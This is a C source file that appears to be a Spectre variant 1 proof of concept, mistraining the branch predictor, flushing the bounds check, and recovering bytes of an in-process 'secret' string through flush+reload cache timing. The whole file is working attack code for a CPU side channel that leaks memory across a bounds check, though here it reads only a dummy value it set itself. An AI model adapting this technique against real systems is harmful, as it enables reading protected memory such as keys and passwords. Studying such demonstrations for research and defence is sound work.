#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <sys/mman.h>
#include <x86intrin.h>


// cache scratchpad array
typedef struct Array {
    char data[0x1000];
} Array;

// value to steal
char secret[100];

// array used in the dangerous logic
char some_array[0x1000];

// used for flush-reload
volatile Array *scratchpad;

// used for branch predictor
volatile Array *temp_scratchpad;

// Size of the array on its own page
volatile int size[0x10000];
volatile int *array_size;

/* some function definitions */
void *
mmap_size(size_t size) {
    return mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
            -1, 0);
}

// allocate all memory
void
alloc_memory() {
   
    // scratchpads for attack	
    scratchpad = mmap_size(sizeof(Array) * 256);
    temp_scratchpad = mmap_size(sizeof(Array) * 256);
   
    // where the bad array has its size stored 
    size[0] = 0x1000;
    array_size = &size[0];
   
    // the secret we will steal 
    memset(secret, 97, 100);
    strcpy(secret, "abcdefgh");
}


// the varient 1 dangerous code.
int spectre_logic(int idx,
                    Array *cachepad) {
    volatile int i = 0;
    if (idx < *array_size && idx >= 0) {
        // excute the following line speculatively
        // will access cachepad indexed by secret[idx]
        i &= cachepad[some_array[idx]].data[0];
    }
    return i;
}

// flush all scratchpad data
void
flush_all() {
    for (int i=0; i<256; i++) {
        _mm_clflush(&scratchpad[i].data[0]);
    }
    _mm_mfence();
}


// reload and get the fastest timing index; also returns timing
uint64_t
reload_fastest(uint64_t *p_timing) {
    uint64_t min_timing = -1ul;
    uint64_t min_idx;

    uint64_t diff;
    uint64_t start;
    uint64_t end;
    volatile char c;
    uint32_t a;

    for (int i = 0; i < 256; i++) {
        start = __rdtscp(&a);
        c = scratchpad[i].data[0];
        end = __rdtscp(&a);
        diff = end - start;
        if (diff < min_timing) {
            min_timing = diff;
            min_idx = i;
        }
    }
    *p_timing = min_timing;
    return min_idx;
}

// Teach the bp to take the branch in the function.
void mistrain_bp() {
	for (int k = 0; k < 256; k++) {
		spectre_logic(k, temp_scratchpad); // VERY IMPORTANT to use a temp scratchpad here, not the real one.
	}
    	_mm_mfence();
}

// Launch spectre.
void
spectre() {
    // For storing the secret.
    char buffer[100];
    memset(buffer, 0, 100);

    for (int i = 0; i < 8; i++) {
        usleep(1000);

	// Clean the cache and branch predictor
        flush_all();
	mistrain_bp();

	// Calculate offset to hit the correct target
	int target_offset = secret - some_array + i;	

	// Flush array size so spec ex has time to happen.  VERY IMPORTANT.
	_mm_clflush(array_size);
    	_mm_mfence();

	// Do the dangerous thing	
	spectre_logic(target_offset, scratchpad);
    	_mm_mfence();
       
        // Reload the secret value	
	uint64_t min_timing = -1ul;
        uint64_t min_index = reload_fastest(&min_timing);
       
        // Skip if we didn't find it.	
	if (min_timing > 100) {
            i--;
            continue;
	} 
       
       	// Save the secret	
	printf("Secret: %d\n", min_index);
	buffer[i] = (char)(min_index);
    }
    printf("Full secret: %s\n", buffer);
}

int
main() {
    alloc_memory();
    spectre();
    return 0;
}

